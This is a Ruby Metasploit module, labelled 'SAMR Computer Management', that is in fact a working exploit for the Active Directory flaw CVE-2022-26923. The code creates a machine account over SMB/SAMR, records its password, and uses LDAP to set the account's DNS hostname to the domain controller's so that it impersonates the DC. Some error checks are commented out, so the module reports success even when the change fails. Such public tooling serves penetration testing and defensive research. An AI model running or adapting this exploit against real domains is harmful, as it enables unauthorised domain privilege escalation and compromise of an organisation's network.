##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAMR Computer Management',
        'Description' => %q{
          Add, lookup and delete computer accounts via MS-SAMR. By default
          standard active directory users can add up to 10 new computers to the
          domain. Administrative privileges however are required to delete the
          created accounts.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'JaGoTu', # @jagotu Original Impacket code
          'Spencer McIntyre',
        ],
        'References' => [
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py'],
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Actions' => [
          [ 'CVE-2022-26923', { 'Description' => 'CVE-2022-26923' } ],
        ],
        'DefaultAction' => 'CVE-2022-26923'
      )
    )

    register_options([
      OptString.new('COMPUTER_NAME', [ false, 'The new computer name' ]),
      OptString.new('COMPUTER_PASSWORD', [ false, 'The password for the new computer' ]),
      OptString.new('DC_NAME', [ true, 'Name of the domain controller being targeted (must match RHOST)' ]),
      OptInt.new('LDAP_PORT', [true, 'LDAP port', 636]),
      Opt::RPORT(445)
    ])
  end

  def ldap_port
    datastore['LDAP_PORT']
  end

  def domain_fqdn
    datastore['SMBDomain']
  end

  def smbuser
    datastore['SMBUser']
  end

  def smbpass
    datastore['SMBPass']
  end

  def smbdomain
    datastore['SMBDomain']
  end

  def ldap_timeout
    datastore['LDAP::ConnectTimeout']
  end

  def dc_name
    datastore['DC_NAME']
  end

  def encrypted_ldap_connection
    case ldap_port
    when 389
      return false
    when 636
      return true
    else
      print_warning("Unrecognize LDAP port. Defaulting to a non-encrypted LDAP connection. This may not work.")
      return false
    end
  end

  def connect_samr
    vprint_status('Connecting to Security Account Manager (SAM) Remote Protocol')
    samr = @tree.open_file(filename: 'samr', write: true, read: true)

    vprint_status('Binding to \\samr...')
    samr.bind(endpoint: RubySMB::Dcerpc::Samr)
    vprint_good('Bound to \\samr')

    samr
  end

  def check_ms_DS_MachineAccountQuota(ldap)
    vprint_status("Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...")
    ldap_options = {
      filter: Net::LDAP::Filter.eq( "objectclass", "domainDNS" ),
      attributes: "ms-DS-MachineAccountQuota"
    }

    result = ldap.search(ldap_options)
    if result.blank?
      print_error("Received no result when trying to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.")
      return 1
    end

    # since we set size to 1, there should be only one entry. let's convert it to a hash so we can get the info we need
    entry = result&.first&.to_h
    if entry.blank? || !entry.kind_of?(Hash) || entry.keys.exclude?(:'ms-ds-machineaccountquota')
      print_error("Received unexpected result when attempting to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.")
      return 1
    end

    ms_ds_machine_account_quota = entry[:'ms-ds-machineaccountquota']&.first&.to_i
    if ms_ds_machine_account_quota.blank?
      print_error("Failed to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.")
      return 1
    end
  
    dn = entry[:dn]
    vprint_status('Received the following entry:')
    if dn.blank?
      # this is unlikely to happen at this point, but you never know
      vprint_status("\tms-DS-MachineAccountQuota: #{ms_ds_machine_account_quota}")
    else
      vprint_status("\tDN: #{dn} - ms-DS-MachineAccountQuota: #{ms_ds_machine_account_quota}")
    end

    if ms_ds_machine_account_quota > 0
      print_status("Obtained ms-DS-MachineAccountQuota: #{ms_ds_machine_account_quota} - We should be able to add a computer account.")
      return 0
    else
      print_error("ms-DS-MachineAccountQuota is #{ms_ds_machine_account_quota}, adding a computer account will likely fail.")
      return 1
    end
  end

  def get_ad_computer_names(ldap)
    ldap_options = {
      filter: Net::LDAP::Filter.eq( "objectclass", "computer" ),
      attributes: "Name"
    }
    result = ldap.search(ldap_options)
    unless ldap.get_operation_result.code == 0
      print_ldap_error(ldap)
      print_warning("Failed to obtain the existing computer names. Adding a computer may not work")
      return 1
    end

    names = []
    result.each do |entry|
      entrie = entry.to_h  
      next unless entrie && entrie.kind_of?(Hash) && entrie.include?(:name)
      c_name = entrie[:name]
      next if c_name.blank?
      names << c_name.first.downcase
    end

    if names.empty?
      print_warning("Failed to obtain any existing computer names. Adding a computer may not work")
    end
    vprint_status("Identified #{names.length} existing computer account(s) for #{smbdomain}")
    names
  end

  def get_dnshostname(ldap, c_name)
    filter1 = Net::LDAP::Filter.eq( "Name", c_name.delete_suffix('$') )
    filter2 = Net::LDAP::Filter.eq( "objectclass", "computer" )
    joined_filter = Net::LDAP::Filter.join(filter1, filter2)
    ldap_options = {
      filter: joined_filter,
      attributes: "DNSHostname"
    }
    result = ldap.search(ldap_options)
    unless ldap.get_operation_result.code == 0
      print_ldap_error(ldap)
      return 1
    end

    entry = result&.first&.to_h
    if entry.blank? || !entry.kind_of?(Hash) || entry.keys.exclude?(:dnshostname)
      return 2
    end

    dnshostname = entry[:dnshostname]&.first
    if dnshostname.blank?
      return 3
    end
    vprint_status("Retrieved original DNSHostame #{dnshostname} for #{c_name}")
    dnshostname
  end

  def get_dc_dnshostname(ldap)
    dnshostname = get_dnshostname(ldap, dc_name)
    case dnshostname
    when 1
      fail_with(Failure::Unknown, "Failed to obtain the existing DNS hostname for the DC")
    when 2
      fail_with(Failure::Unknown, "Received unexpected result when attempting to obtain the existing DNS hostname for the DC")
    when 3
      fail_with(Failure::Unknown, "The received DNS hostname was null or empty")
    end

    dnshostname
  end

  def impersonate_dc(ldap, c_name, c_dn)
    dc_dnshostname = get_dc_dnshostname(ldap)

    original_computer_hostname = get_dnshostname(ldap, c_name)
    ops = []
    case original_computer_hostname
    when 1,3
      print_error("Received unexpected reply when trying to verify the DNS hostname for the new computer #{c_name}.")
      print_warning("The module will proceed, but it may not be possible to change the DNS hostname")
      ops << [
          :add, :dnsHostName, dc_dnshostname
        ] 
    when 2
      vprint_status("The new computer #{c_name} has an unset DNSHostname value, as expected")
      ops << [
          :add, :dnsHostName, dc_dnshostname
        ] 
    else
      fail_with(Failure::Unknown, "The DNSHostName for the new computer #{c_name} has somehow already been set")
    end
    
    print_status("Attempting to set the DNS hostname for the computer #{c_name} to the DNS hostname for the DC: #{dc_dnshostname}")
    result = ldap.modify(dn: c_dn, operations: ops)
    unless ldap.get_operation_result.code == 0
      print_ldap_error(ldap)
      #fail_with(Failure::Unknown, "Failed to set the DNS hostname of computer #{c_name}")
    end

    # obtain the DNS hostname for the new computer to check if it has been correctly set
    new_computer_hostname = get_dnshostname(ldap, c_name)
    unless new_computer_hostname == dc_dnshostname
      print_error("The DNS hostname of computer #{c_name} is #{new_computer_hostname}")
      #fail_with(Failure::Unknown, "Failed to change the DNS hostname of computer #{c_name} to match that of the DC #{dc_name}")
    end

    print_good("Successfully changed the DNS hostname of computer #{c_name} to #{dc_dnshostname}")
  end

  def print_ldap_error(ldap)
    opres = ldap.get_operation_result
    msg = "LDAP error #{opres.code}: #{opres.message}"
    unless opres.error_message.to_s.empty?
      msg += " - #{opres.error_message}"
    end
    print_error("#{@ldap_peer} #{msg}")
  end

  def domain_to_ldif
    ldif = []
    domain_fqdn.split(".").each do |i|
      ldif << "dc=#{i}"
    end
    ldif.join(",")
  end

  def start_ldap()
    @ldap_peer = "#{rhost}:#{ldap_port}"
    print_status("#{@ldap_peer} Authenticating to LDAP via port #{ldap_port}...")
    ldap_options = {
      host:       rhost,
      port:       ldap_port,
      base:       domain_to_ldif,
      auth:
      { 
        username: "#{smbuser}@#{smbdomain}",
        password: smbpass,
        method: :simple
      }
    }
    if encrypted_ldap_connection
      ldap_options[:encryption] = :simple_tls
    end
    ldap_new(ldap_options) do |ldap|
      ldap.bind
      if ldap.get_operation_result.code == 0
        print_good("Successfully authenticated to LDAP via port #{ldap_port}")
        return ldap
      end

      print_ldap_error(ldap)
      fail_with(Failure::NoAccess, "Failed to authenticate to LDAP")
    end
  end

  def run
    begin
      connect
    rescue Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      @samr = connect_samr
      @server_handle = @samr.samr_connect
    rescue RubySMB::Dcerpc::Error::FaultError => e
      elog(e.message, error: e)
      fail_with(Failure::UnexpectedReply, "Connection failed (DCERPC fault: #{e.status_name})")
    end

    if datastore['SMBDomain'].blank? || datastore['SMBDomain'] == '.'
      all_domains = @samr.samr_enumerate_domains_in_sam_server(server_handle: @server_handle).map(&:to_s).map(&:encode)
      all_domains.delete('Builtin')
      if all_domains.empty?
        fail_with(Failure::NotFound, 'No domains were found on the SAM server.')
      elsif all_domains.length > 1
        print_status("Enumerated domains: #{all_domains.join(', ')}")
        fail_with(Failure::BadConfig, 'The SAM server has more than one domain, the target must be specified.')
      end

      @domain_name = all_domains.first
      print_status("Using automatically identified domain: #{@domain_name}")
    else
      @domain_name = datastore['SMBDomain']
    end
    @domain_sid = @samr.samr_lookup_domain(server_handle: @server_handle, name: @domain_name)
    @domain_handle = @samr.samr_open_domain(server_handle: @server_handle, domain_id: @domain_sid)

    # create a computer account
    computer_name = add_computer

    # start ldap
    ldap = start_ldap

    # change the new computer's dnshostname attribute to match that of the DC
    computer_dn = "cn=#{computer_name.delete_suffix('$')},cn=computers,#{domain_to_ldif}"
    impersonate_dc(ldap, computer_name, computer_dn)

    # delete_computer(computer_name)
  rescue RubySMB::Dcerpc::Error::DcerpcError => e
    elog(e.message, error: e)
    fail_with(Failure::UnexpectedReply, e.message)
  rescue RubySMB::Error::RubySMBError
    elog(e.message, error: e)
    fail_with(Failure::Unknown, e.message)
  end

  def random_hostname(prefix: 'DESKTOP')
    "#{prefix}-#{Rex::Text.rand_base(8, '', ('A'..'Z').to_a + ('0'..'9').to_a)}$"
  end

  def add_computer
    if datastore['COMPUTER_NAME'].blank?
      computer_name = random_hostname
      4.downto(0) do |attempt|
        break if @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ]).nil?

        computer_name = random_hostname
        fail_with(Failure::BadConfig, 'Could not find an unused computer name.') if attempt == 0
      end
    else
      computer_name = datastore['COMPUTER_NAME']
      if @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ])
        fail_with(Failure::BadConfig, 'The specified computer name already exists.')
      end
    end

    result = @samr.samr_create_user2_in_domain(
      domain_handle: @domain_handle,
      name: computer_name,
      account_type: RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT,
      desired_access: RubySMB::Dcerpc::Samr::USER_FORCE_PASSWORD_CHANGE | RubySMB::Dcerpc::Samr::MAXIMUM_ALLOWED
    )

    user_handle = result[:user_handle]
    if datastore['COMPUTER_PASSWORD'].blank?
      password = Rex::Text.rand_text_alphanumeric(32)
    else
      password = datastore['COMPUTER_PASSWORD']
    end

    user_info = RubySMB::Dcerpc::Samr::SamprUserInfoBuffer.new(
      tag: RubySMB::Dcerpc::Samr::USER_INTERNAL4_INFORMATION_NEW,
      member: RubySMB::Dcerpc::Samr::SamprUserInternal4InformationNew.new(
        i1: {
          password_expired: 1,
          which_fields: RubySMB::Dcerpc::Samr::USER_ALL_NTPASSWORDPRESENT | RubySMB::Dcerpc::Samr::USER_ALL_PASSWORDEXPIRED
        },
        user_password: {
          buffer: RubySMB::Dcerpc::Samr::SamprEncryptedUserPasswordNew.encrypt_password(
            password,
            @simple.client.application_key
          )
        }
      )
    )
    @samr.samr_set_information_user2(
      user_handle: user_handle,
      user_info: user_info
    )

    user_info = RubySMB::Dcerpc::Samr::SamprUserInfoBuffer.new(
      tag: RubySMB::Dcerpc::Samr::USER_CONTROL_INFORMATION,
      member: RubySMB::Dcerpc::Samr::UserControlInformation.new(
        user_account_control: RubySMB::Dcerpc::Samr::USER_WORKSTATION_TRUST_ACCOUNT
      )
    )
    @samr.samr_set_information_user2(
      user_handle: user_handle,
      user_info: user_info
    )
    print_good("Successfully created #{@domain_name}\\#{computer_name} with password #{password}")
    report_creds(@domain_name, computer_name, password)
    computer_name
  end

  def delete_computer(computer_name)
    details = @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ])
    fail_with(Failure::BadConfig, 'The specified computer was not found.') if details.nil?
    details = details[computer_name]

    handle = @samr.samr_open_user(domain_handle: @domain_handle, user_id: details[:rid])
    @samr.samr_delete_user(user_handle: handle)
    print_good('The specified computer has been deleted.')
  end

  def lookup_computer(computer_name)
    details = @samr.samr_lookup_names_in_domain(domain_handle: @domain_handle, names: [ computer_name ])
    if details.nil?
      print_error('The specified computer was not found.')
      return
    end
    details = details[computer_name]
    sid = @samr.samr_rid_to_sid(object_handle: @domain_handle, rid: details[:rid]).to_s
    print_good("Found #{@domain_name}\\#{computer_name} (SID: #{sid})")
    sid
  end

  def report_creds(domain, username, password)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: password,
      private_type: :password,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: domain
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
